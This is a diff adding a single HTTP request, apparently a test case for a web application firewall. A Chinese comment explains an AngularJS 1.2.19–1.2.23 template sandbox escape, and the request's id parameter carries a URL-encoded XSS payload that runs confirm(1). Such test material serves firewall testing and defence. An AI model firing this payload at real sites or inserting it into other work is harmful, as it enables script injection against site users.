@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_AngularJS-06506752
+# 将 toString 函数的原型中的 toString 方法进行了替换。通过这个替换，当 toString 方法被调用时，实际上是调用了 call 方法，从而使得 toString 方法可以用于执行任意代码。（1.2.19 - 1.2.23）
+GET /?id=%7B%7BtoString.constructor.prototype.toString=toString.constructor.prototype.call%3B%5B%22a%22%2C%22confirm%281%29%22%5D.sort%28toString.constructor%29%3B%7D%7D&bid=hd_tag_m8mv25dz HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25dz
+RM-PRO-Token: 444d223b0071e4ecd0dd4f1eb13e4e19
+RM-PRO-Time: 1742808463185
+User-Agent: curl/7.83.1
+
